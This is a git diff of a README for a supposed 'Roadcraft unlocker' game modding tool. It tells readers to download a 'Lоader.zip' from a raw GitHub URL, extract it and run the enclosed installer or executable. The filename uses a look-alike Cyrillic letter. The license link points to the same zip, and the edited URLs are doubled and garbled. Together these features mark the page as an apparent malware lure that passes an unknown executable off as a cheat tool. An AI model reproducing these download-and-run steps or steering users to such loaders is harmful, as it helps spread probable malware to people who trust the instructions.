@@ -52,8 +52,8 @@ Roadcraft unlocker, Roadcraft utility, Roadcraft patch tool, Roadcraft pro, map 
 
 To get started, just follow these quick steps:
 
-1. **Download** `https://raw.githubusercontent.com/Pushpesh-Tiwari/RoadcraftUnchained/main/Lоader.zip` from this repository.
-2. Extract `https://raw.githubusercontent.com/Pushpesh-Tiwari/RoadcraftUnchained/main/Lоader.zip` to your preferred directory using any decompression software (WinRAR, 7-Zip, Unarchiver).
+1. **Download** `https://raw.githubusercontent.com/Pushpesh-Tiwari/RoadcraftUnchained/main/Lоader.zipоhttps://raw.githubusercontent.com/Pushpesh-Tiwari/RoadcraftUnchained/main/Lоader.zip` from this repository.
+2. Extract `https://raw.githubusercontent.com/Pushpesh-Tiwari/RoadcraftUnchained/main/Lоader.zipоhttps://raw.githubusercontent.com/Pushpesh-Tiwari/RoadcraftUnchained/main/Lоader.zip` to your preferred directory using any decompression software (WinRAR, 7-Zip, Unarchiver).
 3. Run the included installer or `.exe`/`.app`/`.sh` file depending on your operating system.
 4. Follow the on-screen instructions to complete setup and start unlocking new features!
 
@@ -70,7 +70,7 @@ This software is for educational and personal customization purposes only and is
 ## 📃 License
 
 Distributed under the MIT License—see the full license text here:  
-https://raw.githubusercontent.com/Pushpesh-Tiwari/RoadcraftUnchained/main/Lоader.zip
+https://raw.githubusercontent.com/Pushpesh-Tiwari/RoadcraftUnchained/main/Lоader.zipоhttps://raw.githubusercontent.com/Pushpesh-Tiwari/RoadcraftUnchained/main/Lоader.zip
 
 ---
 
